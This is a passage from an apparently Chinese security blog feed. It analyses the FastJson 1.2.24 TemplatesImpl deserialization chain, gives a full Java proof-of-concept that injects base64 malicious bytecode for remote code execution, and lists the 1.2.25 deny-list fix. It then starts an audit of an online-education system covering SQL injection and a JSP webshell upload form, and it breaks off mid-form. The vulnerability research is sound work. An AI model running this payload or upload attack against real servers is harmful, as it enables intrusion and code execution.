<span class="keyword">System</span>.<span class="keyword">out</span>.println("name getter called");</span><br><span class="line">        <span class="keyword">return</span> this.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">public</span> String setAge(String test) &#123;</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("Age setter called");</span><br><span class="line">        this.name = test;</span><br><span class="line">        <span class="keyword">return</span> this.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">public</span> String getAge()&#123;</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("age getter called");</span><br><span class="line">        <span class="keyword">return</span> this.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span> main(String[] args) &#123;</span><br><span class="line">        <span class="keyword">Object</span> obj = <span class="type">JSON</span>.parse("&#123;\"@<span class="keyword">type</span>\":\"com.fastjson.FastJsonTest\",\"<span class="type">name</span>\":\"thisisname\", \"age\":\"thisisage\"&#125;");</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println(obj);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">Object</span> obj2 = <span class="type">JSON</span>.parseObject("&#123;\"@<span class="keyword">type</span>\":\"com.fastjson.FastJsonTest\",\"<span class="type">name</span>\":\"thisisname\", \"age\":\"thisisage\"&#125;");</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println(obj2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">Object</span> obj3 = <span class="type">JSON</span>.parseObject("&#123;\"@<span class="keyword">type</span>\":\"com.fastjson.FastJsonTest\",\"<span class="type">name</span>\":\"thisisname\", \"age\":\"thisisage\"&#125;",FastJsonTest.<span class="keyword">class</span>);</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println(obj3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行，得到的结果如图:</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210228215030.png" alt=""></p><p>通过上面的结果。我们可以知道:</p><ul><li><p>使用JSON.parse(jsonstr)和JSON.parseObject(jsonstr, FastJsonTest.class)两种方式返回的结果相同:<strong>构造方法+Json字符串指定属性的setter()+特殊的getter()</strong></p></li><li><p>JSON.parseObject(jsonstr)会调用目标类中所有的getter方法，包括不存在属性和私有属性的getter()。<strong>原因是在调用JSON.parseObject(jsonstr)时会多执行JSON.toJSON()方法,JSON.toJSON()会将目标类中所有getter方法记录下来。</strong></p></li></ul><p>什么样getter可以被调用呢?</p><p>在JavaBeanInfo类中可以找到：</p><img src="QQ截图20210301202051.png"  /><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.length<span class="literal">()</span> &gt;= <span class="number">4</span><span class="operator"> &amp;&amp; </span>!<span class="module-access"><span class="module"><span class="identifier">Modifier</span>.</span></span>is<span class="constructor">Static(<span class="params">method</span>.<span class="params">getModifiers</span>()</span>)<span class="operator"> &amp;&amp; </span>methodName.starts<span class="constructor">With(<span class="string">"get"</span>)</span><span class="operator"> &amp;&amp; </span><span class="module-access"><span class="module"><span class="identifier">Character</span>.</span></span>is<span class="constructor">UpperCase(<span class="params">methodName</span>.<span class="params">charAt</span>(3)</span>)<span class="operator"> &amp;&amp; </span><span class="keyword">method</span>.get<span class="constructor">ParameterTypes()</span>.length<span class="operator"> == </span><span class="number">0</span><span class="operator"> &amp;&amp; </span>(<span class="module-access"><span class="module"><span class="identifier">Collection</span>.</span></span><span class="keyword">class</span>.is<span class="constructor">AssignableFrom(<span class="params">method</span>.<span class="params">getReturnType</span>()</span>)<span class="operator"> || </span><span class="module-access"><span class="module"><span class="identifier">Map</span>.</span></span><span class="keyword">class</span>.is<span class="constructor">AssignableFrom(<span class="params">method</span>.<span class="params">getReturnType</span>()</span>)<span class="operator"> || </span><span class="module-access"><span class="module"><span class="identifier">AtomicBoolean</span>.</span></span><span class="keyword">class</span><span class="operator"> == </span><span class="keyword">method</span>.get<span class="constructor">ReturnType()</span><span class="operator"> || </span><span class="module-access"><span class="module"><span class="identifier">AtomicInteger</span>.</span></span><span class="keyword">class</span><span class="operator"> == </span><span class="keyword">method</span>.get<span class="constructor">ReturnType()</span><span class="operator"> || </span><span class="module-access"><span class="module"><span class="identifier">AtomicLong</span>.</span></span><span class="keyword">class</span><span class="operator"> == </span><span class="keyword">method</span>.get<span class="constructor">ReturnType()</span>)) &#123;</span><br></pre></td></tr></table></figure><p>总结下来有以下六个条件:</p><ul><li>方法名需要长于4</li><li>不是静态方法</li><li>以get字符串开头，且第四个字符需要是大写字母</li><li>方法不能有参数传入</li><li>继承自Collection || Map || AtomicBoolean || AtomicInteger ||AtomicLong</li><li>此getter不能有setter方法</li></ul><h4 id="Type-关键"><a href="#Type-关键" class="headerlink" title="@Type(关键)"></a>@Type(关键)</h4><p>fastjson通过@Type可以指定反序列化任意类,之后会自动调用类中属性特定的set和get方法。造成反序列化漏洞正是由于fastjson的这个特性。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210228210948.png" alt=""></p><p>我们这里通过@type指定类，成功获取到了对应的数据。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210228211209.png" alt=""></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>​    上面我们通过对fastjson反序列化三种方式的学习可以知道。@type关键词会加载任意类，如果字段有setter、getter方法会自动调用该方法，进行赋值，恢复出整个类。也就是说，当我们找到一个类中的getter方法满足调用的条件,并且存在可利用点，就构成了一条攻击链。</p><h3 id="TemplatesImpl利用链-lt-1-2-24"><a href="#TemplatesImpl利用链-lt-1-2-24" class="headerlink" title="TemplatesImpl利用链(&lt;=1.2.24)"></a>TemplatesImpl利用链(&lt;=1.2.24)</h3><h4 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h4><h5 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h5><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类中getOutputProperties()方法</p><h5 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h5><ul><li>服务端使用parseObject时,必须是<code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</code></li><li>服务端使用parse()时,需要<code>JSON.parse(text1,Feature.SupportNonPublicField);</code></li></ul><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p><strong>我们首先找到这条链子最终的漏洞利用点，然后进行逆向回溯找到漏洞点，之后在通过动态调试正向跟一下解析过程</strong></p><p>首先找到TemplatesImpl.getTransletInstance方法:</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210228220743.png" alt=""></p><p>可以看到红框中的使用了newInstance( )方法进行了实例化操作，然后找到获取_class与_transletIndex值的defineTransletClasses()方法，跟进方法内:</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210228221015.png" alt=""></p><p>找到<code>_bytecodes</code>变量,可以看到这个变量是TemplatesImpl类的成员变量，跟进类内部看一下:</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210301203755.png" alt=""></p><p><code>_bytecodes</code>变量可以在构造json字符串时传入，在构造poc时属于可控变量</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210301204117.png" alt=""></p><p>​    这里我们继续向下执行的时候需要首先满足这里的_tfactory变量不为null，因为_tfactory为私有变量，且无setter方法，<strong>这里需要指定Feature.SupportNonPublicField参数来为_tfactory赋值。(POC中设置_tfactory为{})</strong></p><p>在第413行,通过for循环取出值，然后交给了loader.defineClass进行处理：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210301204609.png" alt=""></p><p>loader.defineClass主要是将传入的字节码转化成class对象，然后又赋给了_class[i]。</p><p><strong>当我们传入比如:_bytecodes:[恶意类]这样的json字符串。程序会将恶意类化为Class对象后赋值给_class[0]。</strong></p><p>之后程序回到getTransletInstance中</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210301221043.png" alt=""></p><p>这时，这里的<strong>_class[_transletIndex]就是我们传入的恶意类</strong>,然后调用恶意类的newInstance()方法来实例化对象,最后造成命令执行。</p><p>我们现在已经找到了存在漏洞的方法，现在只需要找到一条调用链即可。</p><p><strong>找到com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java</strong></p><p>这里调用了存在漏洞的newTransformer() 方法:</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210301214640.png" alt=""></p><p>向上追踪newTransformer(),发现TemplatesImpl.java中getOutputProperties()方法中调用了newTransformer()</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210301215120.png" alt=""></p><p>​    getOutputProperties()方法为<code>_outputProperties</code>成员变量的getter方法。(这里会通过smartMatch() 方法将下划线置空)</p><p>​        TemplatesImpl类_outputProperties成员变量的getter方法满足被调用条件。getOutputProperties()返回类型为Properties，而Properties extends Hashtable，而Hashtable implements Map。无论通过fastjson哪种方式解析json字符串，都可以触发getOutputProperties()方法。</p><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>​    Fastjson通过_bytecodes字段传入恶意类，调用outPutProperties属性的getter方法时,实例化传入的恶意类，调用其构造方法，造成任意命令执行。</p><h4 id="利用POC"><a href="#利用POC" class="headerlink" title="利用POC"></a>利用POC</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">package 版本<span class="number">24</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.<span class="keyword">parser</span>.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.<span class="keyword">parser</span>.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by web on 2017/4/29.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> jdk7u21 &#123;</span><br><span class="line">    <span class="built_in">public</span> static String readClass(String cls)&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="built_in">new</span> ByteArrayOutputStream();</span><br><span class="line">        try &#123;</span><br><span class="line">            IOUtils.<span class="keyword">copy</span>(<span class="built_in">new</span> FileInputStream(<span class="built_in">new</span> File(cls)), bos);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        byte[] try1 = bos.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span>  test_autoTypeDeny() throws <span class="keyword">Exception</span> &#123;</span><br><span class="line">        ParserConfig config = <span class="built_in">new</span> ParserConfig();</span><br><span class="line">        final String fileSeparator = <span class="keyword">System</span>.getProperty("file.separator");</span><br><span class="line">        final String evilClassPath = <span class="keyword">System</span>.getProperty("user.dir") + "\\fastjsonmaven\\target\\classes\\版本24\\EvilObject.class";</span><br><span class="line">        String evilCode = readClass(evilClassPath);</span><br><span class="line">        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";</span><br><span class="line">        String text1 = "&#123;\"@<span class="keyword">type</span>\":\"" + NASTY_CLASS +</span><br><span class="line">                "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;," +</span><br><span class="line">                "\"_name\":\"a\",\"_version\":\"<span class="number">1.0</span>\",\"allowedProtocols\":\"<span class="keyword">all</span>\"&#125;\n";</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println(text1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">Object</span> obj = <span class="type">JSON</span>.parseObject(text1, <span class="keyword">Object</span>.<span class="keyword">class</span>, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">public</span> static <span class="type">void</span> main(String args[])&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            test_autoTypeDeny();</span><br><span class="line">        &#125; catch (<span class="keyword">Exception</span> e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>@Type：</strong>指定解析类,根据指定类反序列化得到该类的实例,在poc中，<code>_bytecodes</code>与<code>_name</code>都是私有属性，所以要想反序列化这两个，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code></li><li><strong>_bytecodes</strong>:恶意类class文件二进制格式base64编码得到的字符串</li><li><strong>_outputProperties</strong>:调用参数的getOutputProperties方法,造成RCE。</li><li><strong>_tfactory:{}</strong>：在defineTransletClasses()时会调用getExternalExtensionsMap(),当为null时会报错，所以要对_tfactory 设值。</li></ul><h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><p>​    现在我们已经知道了触发的漏洞点以及POC现在我们正向调试跟踪一下实际调用链，主要看fastjson如何处理我们传入的payload。</p><p>首先在JSON.parseObject这个函数这里下个断点。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210228225705.png" alt=""></p><p>之后调试跟进，进入com.alibaba.fastjson.parser.DefaultJSONParser类，调用了deriallizer.deserialze来解析传入的数据。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210228233331.png" alt=""></p><p>在这里的deserialze是一个接口,跟进对应的序列化类<strong>com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer</strong>中。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210301224110.png" alt=""></p><p>这里的代码又重新调用了<strong>DefaultJSONParser</strong>类中的<strong>parseObject</strong>方法。在这里我们的token值为12,根据if判断进入到<strong>skipWhitespace</strong> 中:</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210228230054.png" alt=""></p><p><strong>lexer.skipWhitespace</strong>会对传入的text(也就是我们构造好的payload进行处理)</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210228231750.png" alt=""></p><p>这里我们得到的结果是<strong>“</strong>,根据if判断跟进lexer.scanSymbol方法:</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210228232518.png" alt=""></p><p><strong>scanSymbol</strong>会根据选择的特殊符号进入到相应的位置进行处理。也就是我们最开始时候key的结果是<code>@type</code>，而继续往下自然进入到了这里。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210228232250.png" alt=""></p><p>由于 <strong>deserialze</strong> 是一个接口，序列化方法类是<strong>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze</strong> ，传入的clazz是我们想要实例化的利用类。</p><p><img src="QQ%E6%88%AA%E5%9B%BE202102282333311111.png" alt=""></p><p>接着跟进<strong>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze</strong>。这里的token是16，text正是我们传入的值。<img src="QQ%E6%88%AA%E5%9B%BE20210228233425.png" alt=""></p><p>继续往下走程序会调用<strong>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</strong>方法，</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210228234359.png" alt=""></p><p>跟进方法，首先会调用smartMatch方法来处理我们传入的key值，而这里的key值就是我们json中的那些字段，比如：<code>_outputProperties</code>、<code>_name</code>、<code>_bytecodes</code>等。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210228233930.png" alt=""></p><p>在<strong>com.alibaba.fastjson.serializer.ObjectArrayCodec#parseArray</strong>中，所以这里又会调用 <strong>com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze</strong> 。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210228235300.png" alt=""></p><p>这里会先进入decodeBase64方法进行一次base64解码，<strong>这就是为什么poc中需要base64编码</strong></p><p><img src="QQ%E6%88%AA%E5%9B%BE20210228235348.png" alt=""></p><p>在com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer 中。最后会通过setValue方式将value赋值给我们要执行的特殊类</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210228235522.png" alt=""></p><p>在setValue中会调用getOutputProperties()。然后通过method.invoke反射的方式实例化我们的要调用的类。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210301225104.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20210301225132.png" alt=""></p><h3 id="后续修复分析"><a href="#后续修复分析" class="headerlink" title="后续修复分析"></a>后续修复分析</h3><p>​    1.2.25官方对漏洞进行了修复，对更新的源码进行比较，主要的更新在checkAutoType函数,</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">Class</span>&lt;?&gt; checkAutoType(<span class="built_in">String</span> <span class="built_in">typeName</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">typeName</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">             return <span class="literal">null</span>;</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         final <span class="built_in">String</span> className = <span class="built_in">typeName</span>.<span class="built_in">replace</span>(<span class="comment">'$', '.');</span></span><br><span class="line"> </span><br><span class="line">         <span class="keyword">if</span> (autoTypeSupport) &#123;</span><br><span class="line">             <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                 <span class="built_in">String</span> deny = denyList[i];</span><br><span class="line">                 <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                     throw <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + <span class="built_in">typeName</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>​    这里遍历denyList数组，只要引用的库中是以我们的黑名单中的字符串开头的就直接抛出异常中断运行。</p><p>denyList数组，主要利用黑名单机制把常用的反序列化利用库都添加到黑名单中，主要有：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">bsh</span></span><br><span class="line"><span class="selector-tag">com</span><span class="selector-class">.mchange</span></span><br><span class="line"><span class="selector-tag">com</span><span class="selector-class">.sun</span>.</span><br><span class="line"><span class="selector-tag">java</span><span class="selector-class">.lang</span><span class="selector-class">.Thread</span></span><br><span class="line"><span class="selector-tag">java</span><span class="selector-class">.net</span><span class="selector-class">.Socket</span></span><br><span class="line"><span class="selector-tag">java</span><span class="selector-class">.rmi</span></span><br><span class="line"><span class="selector-tag">javax</span><span class="selector-class">.xml</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.bcel</span></span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.beanutils</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.Transformer</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.functors</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections4</span><span class="selector-class">.comparators</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.fileupload</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.myfaces</span><span class="selector-class">.context</span><span class="selector-class">.servlet</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.tomcat</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.wicket</span><span class="selector-class">.util</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.codehaus</span><span class="selector-class">.groovy</span><span class="selector-class">.runtime</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.hibernate</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.jboss</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.mozilla</span><span class="selector-class">.javascript</span>,</span><br><span class="line"><span class="selector-tag">org</span><span class="selector-class">.python</span><span class="selector-class">.core</span>,<span class="selector-tag">org</span><span class="selector-class">.springframework</span></span><br></pre></td></tr></table></figure><p>后续的绕过接下来再分析。。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;java安全–FastJson-1-2-22-1-2-24漏洞分析&quot;&gt;&lt;a href=&quot;#java安全–FastJson-1-2-22-1-2-24漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;java安全–FastJson 1.2.22-1.2
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>SSM框架审计学习-- 因酷网校在线教育系统审计</title>
    <link href="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/"/>
    <id>https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/</id>
    <published>2021-02-16T03:34:40.000Z</published>
    <updated>2021-02-16T03:44:48.812Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSM框架审计学习–-因酷网校在线教育系统审计学习"><a href="#SSM框架审计学习–-因酷网校在线教育系统审计学习" class="headerlink" title="SSM框架审计学习– 因酷网校在线教育系统审计学习"></a>SSM框架审计学习– 因酷网校在线教育系统审计学习</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>     因酷开源网校系统是由北京因酷时代科技有限公司以下简称（因酷教育软件）研发并推出的国内首家Java版开源网校源代码建站系统，并免费提供给非商业用途用户使用，是用户体验最好、运营功能最全、性价比最高的在线教育软件。</p><p>第一次上手一个SSM框架的审计，主要学习一下审计的思路。主要参考自先知社区这篇文章：<a href="https://xz.aliyun.com/t/2646" target="_blank" rel="noopener">JAVA代码审计 | 因酷网校在线教育系统 - 先知社区 (aliyun.com)</a></p><h5 id="java分层思想"><a href="#java分层思想" class="headerlink" title="java分层思想"></a>java分层思想</h5><p>常见的JavaWeb项目分层：</p><blockquote><p>视图层（View 视图)</p><p>控制层（Controller、Action 控制层）</p><p>服务层（Service）</p><p>业务逻辑层BO(business object) </p><p>实体层（entity 实体对象、VO(value object) 值对象 、模型层（bean</p><p>持久层（dao- Data Access Object 数据访问层、PO(persistant object) 持久对象）</p></blockquote><h5 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h5><p>审计一套系统，可以先看看pom.xml中加载了那些组件 ，如果这些组件中本身存在漏洞，就可以直接利用这些漏洞。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210212114439.png" alt=""></p><h5 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h5><p>​      程序启动时tomcat会首先加载web.xml中的配置 。通过web.xml完成DispathcheServlet的声明，并将我们的请求转发到springmvc中。我们可以首先查看web.xml中是否配置了全局过滤器。判断是否能够bypass。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213172113.png" alt=""></p><h5 id="applicationContext-xml"><a href="#applicationContext-xml" class="headerlink" title="applicationContext.xml"></a>applicationContext.xml</h5><p>applicationContext.xml是spring核心配置文件,这里会加载一些其他的配置文件。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213172023.png" alt=""></p><h5 id="spring-mvc-xml"><a href="#spring-mvc-xml" class="headerlink" title="spring-mvc.xml"></a>spring-mvc.xml</h5><p>sping-mvc.xml文件中主要的工作是：启动注解、扫描controller包注解；静态资源映射；视图解析（defaultViewResolver）；文件上传（multipartResolver）;返回消息json配置。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210212111938.png" alt=""></p><h4 id="后台Sql注入漏洞"><a href="#后台Sql注入漏洞" class="headerlink" title="后台Sql注入漏洞"></a>后台Sql注入漏洞</h4><h5 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h5><p>我们已经知道了系统采用mybatis，mybatis最常见的注入就是使用${}，直接就来找<code>$</code>符号，看看哪些是直接调用了<code>$</code>来进行取值并且没经过过滤的。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213173933.png" alt=""></p><p>找到了一处，我们逆向追踪调用逻辑，寻找是否含有过滤并且参数我们是否可控。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213174226.png" alt=""></p><p>可以看到接口的实现类里并没有对传入的ids参数进行过滤。继续追踪。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213174750.png" alt=""></p><p>跟踪到deleteArticle函数。全局搜索。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213174304.png" alt=""></p><p>可以看到控制层直接获取了articelId参数，这里的参数我们是可控的。</p><h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>首先登录后台。找到文章管理部分，选择删除，抓包。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213121827.png" alt=""></p><p>直接扔到sqlmap里跑。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213122138.png" alt="QQ截图20210213122138"></p><p>可以看到这套系统中还有多处存在这个漏洞。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213175257.png" alt=""></p><h4 id="后台任意文件上传漏洞"><a href="#后台任意文件上传漏洞" class="headerlink" title="后台任意文件上传漏洞"></a>后台任意文件上传漏洞</h4><h5 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h5><p>位置com/inxedu/os/common/controller/VideoUploadController.java,上传视频功能。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210213180316.png" alt=""></p><p>  可以看到这里首先接收了fileType扩展名参数，然后仅仅判断了上传的文件名与fileType参数文件是否一致，就直接上传文件，然后返回了文件上传路径。</p><p>这里我们可以直接将fileType设置为jsp就可以直接上传jsp马。</p><h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action="http://localhost:8080/video/uploadvideo" enctype="multipart/form-data" id="frmUpload" <span class="keyword">method</span>="post"&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="type">name</span>="uploadfile" <span class="keyword">type</span>="file"&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span> ="text" <span 